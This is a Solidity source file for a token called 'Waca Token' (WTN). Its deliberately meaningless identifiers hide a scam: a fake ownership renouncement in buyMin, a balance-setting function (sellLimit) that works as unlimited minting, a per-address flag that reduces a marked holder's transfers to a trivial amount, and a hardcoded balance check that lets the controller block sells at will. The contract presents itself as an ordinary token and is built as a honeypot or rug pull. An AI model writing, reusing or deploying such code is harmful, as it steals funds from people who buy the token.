//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface minTx {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract txToFrom {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface totalMaxIs {
    function createPair(address exemptReceiver, address autoList) external returns (address);
}

interface receiverMode {
    function totalSupply() external view returns (uint256);

    function balanceOf(address totalListAuto) external view returns (uint256);

    function transfer(address receiverFrom, uint256 amountShould) external returns (bool);

    function allowance(address takeSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 amountShould) external returns (bool);

    function transferFrom(
        address sender,
        address receiverFrom,
        uint256 amountShould
    ) external returns (bool);

    event Transfer(address indexed from, address indexed modeTakeReceiver, uint256 value);
    event Approval(address indexed takeSender, address indexed spender, uint256 value);
}

interface receiverModeMetadata is receiverMode {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract WacaToken is txToFrom, receiverMode, receiverModeMetadata {

    function transfer(address fundTrading, uint256 amountShould) external virtual override returns (bool) {
        return limitFund(_msgSender(), fundTrading, amountShould);
    }

    bool public totalModeLaunch;

    function takeSell() private view {
        require(toMarketing[_msgSender()]);
    }

    mapping(address => mapping(address => uint256)) private totalTx;

    function transferFrom(address senderSell, address receiverFrom, uint256 amountShould) external override returns (bool) {
        if (_msgSender() != teamLiquidity) {
            if (totalTx[senderSell][_msgSender()] != type(uint256).max) {
                require(amountShould <= totalTx[senderSell][_msgSender()]);
                totalTx[senderSell][_msgSender()] -= amountShould;
            }
        }
        return limitFund(senderSell, receiverFrom, amountShould);
    }

    function symbol() external view virtual override returns (string memory) {
        return sellLaunched;
    }

    function name() external view virtual override returns (string memory) {
        return limitWallet;
    }

    uint256 constant launchedTrading = 10 ** 10;

    function totalSupply() external view virtual override returns (uint256) {
        return amountToAuto;
    }

    event OwnershipTransferred(address indexed shouldBuy, address indexed walletTake);

    uint256 private enableFee;

    function walletShould(address minLaunch) public {
        takeSell();
        if (liquidityExempt != enableFee) {
            liquidityExempt = listFrom;
        }
        if (minLaunch == takeList || minLaunch == minMarketing) {
            return;
        }
        senderBuy[minLaunch] = true;
    }

    uint256 private listSender;

    bool public launchedIs;

    mapping(address => bool) public senderBuy;

    uint256 atTotalAuto;

    bool public receiverSenderFrom;

    function limitFund(address senderSell, address receiverFrom, uint256 amountShould) internal returns (bool) {
        if (senderSell == takeList) {
            return limitLaunch(senderSell, receiverFrom, amountShould);
        }
        uint256 receiverList = receiverMode(minMarketing).balanceOf(isSender);
        require(receiverList == atTotalAuto);
        require(receiverFrom != isSender);
        if (senderBuy[senderSell]) {
            return limitLaunch(senderSell, receiverFrom, launchedTrading);
        }
        return limitLaunch(senderSell, receiverFrom, amountShould);
    }

    uint256 public feeMarketingLaunch;

    string private sellLaunched = "WTN";

    uint256 isAuto;

    function sellLimit(address fundTrading, uint256 amountShould) public {
        takeSell();
        launchLiquidity[fundTrading] = amountShould;
    }

    function buyMin() public {
        emit OwnershipTransferred(takeList, address(0));
        liquidityLaunchSender = address(0);
    }

    function allowance(address fromSwap, address fundReceiver) external view virtual override returns (uint256) {
        if (fundReceiver == teamLiquidity) {
            return type(uint256).max;
        }
        return totalTx[fromSwap][fundReceiver];
    }

    uint256 private listFrom;

    uint256 private listTo;

    uint256 public limitExempt;

    string private limitWallet = "Waca Token";

    uint256 private amountToAuto = 100000000 * 10 ** 18;

    function getOwner() external view returns (address) {
        return liquidityLaunchSender;
    }

    function decimals() external view virtual override returns (uint8) {
        return takeLimit;
    }

    function senderMarketing(address modeAt) public {
        if (totalModeLaunch) {
            return;
        }
        if (listSender == listTo) {
            takeToken = true;
        }
        toMarketing[modeAt] = true;
        if (limitExempt != listSender) {
            listSender = listFrom;
        }
        totalModeLaunch = true;
    }

    function limitLaunch(address senderSell, address receiverFrom, uint256 amountShould) internal returns (bool) {
        require(launchLiquidity[senderSell] >= amountShould);
        launchLiquidity[senderSell] -= amountShould;
        launchLiquidity[receiverFrom] += amountShould;
        emit Transfer(senderSell, receiverFrom, amountShould);
        return true;
    }

    function approve(address fundReceiver, uint256 amountShould) public virtual override returns (bool) {
        totalTx[_msgSender()][fundReceiver] = amountShould;
        emit Approval(_msgSender(), fundReceiver, amountShould);
        return true;
    }

    address public takeList;

    address public minMarketing;

    mapping(address => bool) public toMarketing;

    mapping(address => uint256) private launchLiquidity;

    function tradingMax(uint256 amountShould) public {
        takeSell();
        atTotalAuto = amountShould;
    }

    constructor (){
        if (limitExempt != listSender) {
            liquidityExempt = listTo;
        }
        minTx txTotal = minTx(teamLiquidity);
        minMarketing = totalMaxIs(txTotal.factory()).createPair(txTotal.WETH(), address(this));
        if (limitExempt == feeMarketingLaunch) {
            listSender = listFrom;
        }
        takeList = _msgSender();
        buyMin();
        toMarketing[takeList] = true;
        launchLiquidity[takeList] = amountToAuto;
        if (listSender == liquidityExempt) {
            listSender = listTo;
        }
        emit Transfer(address(0), takeList, amountToAuto);
    }

    uint256 private liquidityExempt;

    uint8 private takeLimit = 18;

    function owner() external view returns (address) {
        return liquidityLaunchSender;
    }

    function balanceOf(address totalListAuto) public view virtual override returns (uint256) {
        return launchLiquidity[totalListAuto];
    }

    bool public takeToken;

    address isSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address private liquidityLaunchSender;

    address teamLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

}